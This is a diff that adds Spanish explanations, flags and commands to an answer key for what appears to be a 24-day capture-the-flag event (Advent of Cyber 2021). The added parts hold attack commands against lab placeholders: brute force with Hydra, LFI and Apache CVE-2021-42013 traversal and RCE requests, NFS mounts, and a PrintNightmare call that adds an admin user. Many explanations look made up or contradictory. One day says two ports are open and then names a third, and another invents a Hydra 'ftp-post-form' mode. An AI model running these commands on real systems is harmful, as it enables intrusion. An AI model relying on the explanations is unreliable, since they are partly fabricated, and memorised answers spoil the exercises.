@@ -17,11 +17,15 @@
 
 ### Task 1: Introducción
 
+**Explicación:** Presentación de la edición 2021: retorno del Grinch contra McSkidy y la "Best Festival Company". 24 días con web, red, Windows, nube y análisis. Solo lectura.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Lee la introducción del evento. | `No answer needed` |
 
 ### Task 2: Preparación del evento
+
+**Explicación:** Configuración del entorno: activar la máquina del día, VPN/AttackBox, acceso web al laboratorio y verificación de conectividad. Sin respuestas.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -32,11 +36,15 @@
 
 ### Task 3: Historia de fondo
 
+**Explicación:** Narrativa 2021: tras el saboteo de la producción de regalos, el Grinch ataca la infraestructura (HR-Portal, correos falsificados, almacenes S3). Solo lectura de la historia.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Lee la historia del evento. | `No answer needed` |
 
 ### Task 4: Despliegue
+
+**Explicación:** Despliegue de la máquina objetivo del día y espera a que arranque antes de atacar.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -44,11 +52,21 @@
 
 ### Task 5: Primeros pasos
 
+**Explicación:** Primeros pasos guiados en la interfaz del evento para familiarizarse con los retos diarios.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Realiza los primeros pasos del reto. | `No answer needed` |
 
 ### Task 6: Día 1 - IDOR (Identificadores inseguros)
+
+**Explicación:** La API de empleados usa IDs secuenciales (IDOR): cambiando el ID se accede a datos ajenos. El usuario `0` es `The Boss!`; el primer empleado tiene rol `Build Manager` y el segundo `Mischief Manager`. La flag es `THM{AOC_IDOR_2B34BHI3}`. Lección: validar la autorización por objeto (BOLA/IDOR) y usar IDs no adivinables.
+
+```bash
+curl http://MACHINE_IP/api/user/0
+curl http://MACHINE_IP/api/user/1
+curl http://MACHINE_IP/api/user/2
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -60,6 +78,8 @@
 | 6 | Termina el apartado de enumeración. | `No answer needed` |
 
 ### Task 7: Día 2 - Cookies y autenticación
+
+**Explicación:** La cookie de sesión `user-auth` está en hexadecimal; al decodificarla (CyberChef hex→texto) se ve un JSON. La cookie de admin en bruto es `7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a2261646d696e227d`. Editando `username:admin` se llega a la sección interna `HR` y se abre la `Application` interna. Lección: no confiar en datos de sesión solo codificados (hex/base64/JSON) sin firma.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -75,6 +95,12 @@
 
 ### Task 8: Día 3 - Software CMS (brute force/WordPress)
 
+**Explicación:** El sitio WordPress expone usuarios: `admin` y `administrator`. Forzando el login (Hydra/wp-scan) el acceso administrativo confirma la cuenta y la flag es `THM{ADM1N_AC3SS}`. Lección: los CMS revelan usuarios en /wp-json y los paneles sin rate-limiting se fuerzan.
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt MACHINE_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password"
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es el nombre del usuario con acceso de administrador que encuentras? | `admin` |
@@ -82,6 +108,8 @@
 | 3 | ¿Cuál es la flag del acceso administrativo? | `THM{ADM1N_AC3SS}` |
 
 ### Task 9: Día 4 - Sesiones y web cache
+
+**Explicación:** Manipulación de sesión y caché web (web cache poison): alterando la cabecera `cookie` de la petición se consigue que la caché devuelva la respuesta de otro contexto; la flag es `THM{SANTA_DELIVERS}`. Lección: la caché que no distingue las respuestas por cookie puede servir datos de otras sesiones.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -92,11 +120,19 @@
 
 ### Task 10: Día 5 - Reconocimiento web
 
+**Explicación:** Enumeración del sitio: con GoBuster/inspección se localiza contenido oculto; la flag tras enumerar la aplicación es `THM{NO_MORE_BUTTMAS}`. Lección: repasar todas las rutas y el código fuente durante el reconocimiento.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es la flag obtenida tras enumerar la aplicación? | `THM{NO_MORE_BUTTMAS}` |
 
 ### Task 11: Día 6 - Local File Inclusion (Flask)
+
+**Explicación:** LFI en una app Flask: la entrada devuelve `err` al probarla y permite incluir archivos locales. Se leen las tres flags (`THM{d29e08941cf7fe41df55f1a7da6c4c06}`, `THM{791d43d46018a0d89361dbf60d5d9eb8}`, `THM{552f313b52e3c3dbf5257d8c6db7f6f1}`), credenciales `McSkidy:A0C315Aw3s0m` y el directorio clave `lfi-aoc-awesome-59aedca683fff9261263bb084880c965`. Lección: los frameworks con plantillas/renderizados mal saneados dejan incluir rutas arbitrarias.
+
+```text
+http://MACHINE_IP/?file=../../etc/passwd
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -110,6 +146,8 @@
 
 ### Task 12: Día 7 - Base de datos (MongoDB/SSRF)
 
+**Explicación:** SSRF en la web para llegar a MongoDB interno: se obtienen tres flags (`THM{8814a5e6662a9763f7df23ee59d944f9}`, `THM{b6b304f5d5834a4d089b570840b467a8}`, `THM{2ec099f2d602cc4968c5267970be1326}`) y la entrada del usuario admin: `ID:6184f516ef6da50433f100f4:mcskidy:admin`. Lección: los backends internos alcanzables por SSRF exponen bases de datos sin exponerlas al exterior.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es el contenido de la primera flag? | `THM{8814a5e6662a9763f7df23ee59d944f9}` |
@@ -118,6 +156,8 @@
 | 4 | ¿Qué entrada de la base de datos contiene la clave del usuario admin? | `ID:6184f516ef6da50433f100f4:mcskidy:admin` |
 
 ### Task 13: Día 8 - Forense de malware (Windows)
+
+**Explicación:** Forense del incidente sobre Windows 11 Pro (`Microsoft Windows 11 Pro`). La contraseña hallada es `grinchstolechristmas`; el análisis del `UsrClass.dat` (`C:\Users\santa\AppData\Local\Microsoft\Windows\UsrClass.dat`) muestra ejecuciones; el archivo se transfirió con `certutil.exe`. El atacante tiene el repositorio `.github` con la operación `operation-bag-of-toys`, el paquete `bag_of_toys.zip` con contraseñas `Grinchiest`/`GRINCHMAS`, el instalador `uharc-cmd-install.exe`, luego `TheGrinchiestGrinchmasOfAll` y el cierre numérico `228`. Lección: registry hives (UsrClass.dat) + reviewer de repositorios para rastrear el kit de ataque.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -139,6 +179,12 @@
 
 ### Task 14: Día 9 - FTP (Hydra)
 
+**Explicación:** El servicio web lleva a la página `login`; con Hydra se obtienen `McSkidy:Christmas2021!`. Enviando un User-Agent personalizado se obtiene `TryHackMe-UserAgent-THM{d8ab1be969825f2c5c937aec23d55bc9}`; la flag del FTP es `THM{dd63a80bf9fdd21aabbf70af7438c257}`. La contraseña real en el FTP es `TryH@ckM3!`; el comando para subir es `STOR`; y en notas aparece `123^-^321`. Lección: Hydra sobre ftp-post-form, comandos FTP (STOR) y archivos ocultos del servicio.
+
+```bash
+hydra -l McSkidy -P /usr/share/wordlists/rockyou.txt ftp://MACHINE_IP
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿A qué página/directorio te lleva la web del servicio? | `login` |
@@ -150,6 +196,13 @@
 | 7 | ¿Cuál es la contraseña encontrada en las notas del servidor? | `123^-^321` |
 
 ### Task 15: Día 10 - Escaneo de puertos (Apache 2.4.49)
+
+**Explicación:** Nmap sobre la máquina: `2` puertos abiertos, SSH en `22` y el servicio web `HTTP`. Las credenciales por defecto del servicio permiten el acceso (`Y`). El servidor es `Apache httpd 2.4.49`, vulnerable al `CVE-2021-42013` (path traversal + RCE). El puerto adicional abierto es `20212` corriendo `telnetd`. Lección: versiones exactas de Apache → CVE de traversal.
+
+```bash
+curl "http://MACHINE_IP/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+curl "http://MACHINE_IP/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d 'echo; whoami'
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -165,6 +218,8 @@
 
 ### Task 16: Día 11 - Inyección SQL sobre MSSQL
 
+**Explicación:** MSSQL en el puerto `1433`; la shell interactiva SQL muestra el prompt `1>`. Las consultas devuelven `Rudolph`, la ubicación `Prague`, y hay un puerto UDP adicional en `25000`. La flag es `THM{YjtKeUy2qT3v5dDH}`. Lección: interactuar con la shell de la BD para enumerar datos y habilitar xp_cmdshell si es posible.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Qué puerto usa el servicio de base de datos MSSQL? | `1433` |
@@ -176,6 +231,13 @@
 | 7 | Continúa con la explotación de la base de datos. | `No answer needed` |
 
 ### Task 17: Día 12 - NFS
+
+**Explicación:** Escaneo del host: `7` puertos relevantes; NFS en `2049` con `4` shares enumerables. Montando el share se ven `3` archivos, el primero `Meditations`; la carpeta `confidential` contiene la flag `3e2d315a38f377f304f5598dc2f044de`. Lección: enumerar/montar shares NFS (`showmount -e`, `mount -t nfs`) para leer archivos sin credenciales.
+
+```bash
+showmount -e MACHINE_IP
+mkdir /tmp/nfs && mount -t nfs MACHINE_IP:/share /tmp/nfs
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -189,6 +251,8 @@
 
 ### Task 18: Día 13 - Escalada de privilegios Windows (Iperius)
 
+**Explicación:** Acceso inicial con la credencial `pepper` sobre Windows `10.0.17763 N/A Build 17763`. El servicio vulnerable es `IperiusSvc` (`C:\Program Files (x86)\Iperius Backup\IperiusService.exe`); se abusa de su cuenta/ejecución para escalar como `the-grinch-hack\thegrinch`, obteniendo la flag `THM-736635221` y la contraseña `jazzercize`. Lección: los servicios de backup ejecutados con altos permisos y configuración manipulable dan escalada.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Qué credencial de acceso inicial se menciona en el laboratorio? | `pepper` |
@@ -201,6 +265,13 @@
 
 ### Task 19: Día 14 - Crackeo de archivos comprimidos
 
+**Explicación:** El directorio contiene `4` archivos y todos son archivos comprimidos. Con zip2john/john se crackea el primero (`ZUP42`) y el archivo final libera la contraseña/flag `DI3H4rdIsTheBestX-masMovie!`. Lección: `zip2john` + john descifra archivos cifrados con contraseñas débiles.
+
+```bash
+zip2john archivo.zip > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuántos archivos hay en el directorio del reto? | `4` |
@@ -210,12 +281,16 @@
 
 ### Task 20: Día 15 - Preparación del siguiente bloque
 
+**Explicación:** Tarea intermedia de teoría/vídeo para preparar el bloque final del evento (OSINT, nube y phishing). Solo lectura.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Revisa el material teórico de la sección. | `No answer needed` |
 | 2 | Sigue el vídeo/guía de preparación. | `No answer needed` |
 
 ### Task 21: Día 16 - OSINT (Grinch Who)
+
+**Explicación:** Investigación OSINT: el sospechoso usa el usuario de Twitter `GrinchWho31`; sus direcciones de criptomoneda son `1GW8QR7CWW3cpvVPGMCF5tZz4j96ncEgrVaR` (base58) y `bc1q5q2w2x6yka5gchr89988p2c8w8nquem6tndw2f` (segwit); mantiene identidad en `keybase.io`, código en `GitHub`, correo `DonteHeath21@gmail.com` y su nombre real es `Donte Heath`. Lección: cruzar perfiles sociales, billeteras y keybase para deanonimizar al operador.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -231,6 +306,14 @@
 
 ### Task 22: Día 17 - Buckets S3 (AWS)
 
+**Explicación:** El bucket S3 público expone el hostname `images.bestfestivalcompany.com`, el mensaje `It's easy to get your elves data when you leave it so easy to find!` y el backup `wp-backup.zip`. Del contenido se extrae la Access Key `AKIAQI52OJVCPZXFYAOI`, Account ID `019181489476`, el correo RRHH `ElfMcHR@bfc.com`, el portal interno `HR-Portal` con contraseña `Winter2021!`. Lección: buckets listables + backups filtrados completan el kill chain.
+
+```bash
+aws s3 ls s3://BUCKET --no-sign-request
+aws s3 cp s3://BUCKET/wp-backup.zip . --no-sign-request
+unzip wp-backup.zip
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es el hostname subyacente del bucket S3? | `images.bestfestivalcompany.com` |
@@ -244,6 +327,14 @@
 
 ### Task 23: Día 18 - Docker (capas de imagen)
 
+**Explicación:** Análisis de una imagen Docker: `docker images` lista las imágenes locales, `docker save` las exporta a un archivo, y el manifiesto que describe las capas es `manifest.json`. El blob/config que contiene el dato buscado tiene el hash `7095b3e9300542edadbc2dd558ac11fa`. Lección: las imágenes Docker son capas que se pueden inspeccionar offline.
+
+```bash
+docker images
+docker save -o img.tar NOMBRE_IMAGEN
+tar -xvf img.tar && ls && cat manifest.json
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Qué comando se usa para listar las imágenes locales de Docker? | `docker images` |
@@ -252,6 +343,8 @@
 | 4 | ¿Cuál es el hash del blob/config que contiene el dato buscado? | `7095b3e9300542edadbc2dd558ac11fa` |
 
 ### Task 24: Día 19 - Análisis de phishing
+
+**Explicación:** Comparativa de correos: el legítimo es `elfmcphearson@tbfc.com` y el suplantado `customerservice@t8fc.info` (dominio casi idéntico). El Reply-To del atacante es `fisher@tempmailz.grinch`; error de escritura `stright`; enlace `https://89xgwsnmo5.grinch/out/fishing/`; cabecera `X-GrinchPhish: >;^)`; adjunto `password-reset-instructions.pdf`. La flag es `THM{A0C_Thr33_Ph1sh1ng_An4lys!s}`. Lección: dominios typosquat, cabeceras y adjuntos delatan el phishing.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -267,6 +360,12 @@
 
 ### Task 25: Día 20 - Antivirus (ClamAV / EICAR)
 
+**Explicación:** Prueba del antivirus ClamAV con el archivo EICAR (128 bytes): la cadena de prueba es `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`. ClamAV lo clasifica como `EICAR virus test files` con firma `Virus:DOS/EICAR_Test_File`; la fecha de actualización de firmas es `2005-10-17 22:03:48` y la referencia de la "firma" es `ducklin.htm or ducklin-html.htm`. Lección: verificar que el AV detecta con la firma estándar EICAR.
+
+```bash
+clamscan eicar.txt
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es la cadena de prueba EICAR del laboratorio? | `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*` |
@@ -278,6 +377,8 @@
 
 ### Task 26: Día 21 - Análisis de metadatos
 
+**Explicación:** Análisis de metadatos de un binario (uso de `exiftool`/`pdfinfo`): las instrucciones destacan la operación `or` con la bandera `-m`, la sección `metadata` con la bandera `-n`, y la consulta final devuelve el valor `0`. Lección: ajustar las banderas de la herramienta (p. ej., `exiftool -m -n`) para volcar los metadatos completos.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Qué instrucción/operación destaca al examinar el archivo binario? | `or` |
@@ -287,6 +388,15 @@
 | 5 | ¿Cuál es el resultado/valor de la consulta final? | `0` |
 
 ### Task 27: Día 22 - Envío de correos (SMTP)
+
+**Explicación:** Envío SMTP desde la cuenta `Grinch.Enterprises.2021@gmail.com` con contraseña `S@ntai$comingt0t0wn`, asunto/plantilla `Christmas Wishlist`, puerto `587` (SMTP con STARTTLS). En el servidor de correo aparece la cookie `YouFoundGrinchCookie` y la cadena final del envío es `S@nt@c1Au$IsrEAl`. Lección: las credenciales SMTP expuestas permiten phishing a gran escala; puerto 587 = envío autenticado.
+
+```python
+import smtplib
+server = smtplib.SMTP('smtp.gmail.com', 587)
+server.starttls()
+server.login('Grinch.Enterprises.2021@gmail.com', 'S@ntai$comingt0t0wn')
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -298,6 +408,13 @@
 | 6 | ¿Cuál es la cadena/resultado final del envío (flag)? | `S@nt@c1Au$IsrEAl` |
 
 ### Task 28: Día 23 - Explotación (PrintNightmare)
+
+**Explicación:** PrintNightmare (CVE-2021-1675/34527, Print Spooler) se explota con `Invoke-Nightmare`, que crea el usuario local `adm1n`; el payload devuelve un reverse shell a `10.10.148.96,4321`. La task oculta tiene el ID `j3pn50vkw21hhurbqmxjlpmo9doiukyb`; para limpiar artefactos se usa `sdelete.exe`; el log de la máquina marca `11/11/2021 7:29:27 PM` y Mission Control termina con `letitsnowletitsnowletitsnow`. Lección: el Print Spooler sin parchear es RCE en todo el dominio.
+
+```powershell
+Import-Module .\Invoke-Nightmare.ps1
+Invoke-Nightmare -NewUser "adm1n" -NewPassword "pwned" -DriverName "PrintSpoofer"
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -311,6 +428,12 @@
 
 ### Task 29: Día 24 - Crackeo de contraseñas
 
+**Explicación:** Crackeo de un hash MD5: el usuario objetivo es `emily`, el hash es `8af326aa4850225b75c592d4ce19ccf5` y la contraseña en claro es `1234567890`. Lección: hashes débiles y sin salt se resuelven al instante con john/hashcat.
+
+```bash
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es el nombre del usuario objetivo? | `emily` |
@@ -318,6 +441,8 @@
 | 3 | ¿Cuál es la contraseña en texto plano? | `1234567890` |
 
 ### Task 30: Conclusión
+
+**Explicación:** Cierre del evento: la flag de agradecimiento es `thm{thank_you_2021}`; después se completa la encuesta y se comparte el progreso.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
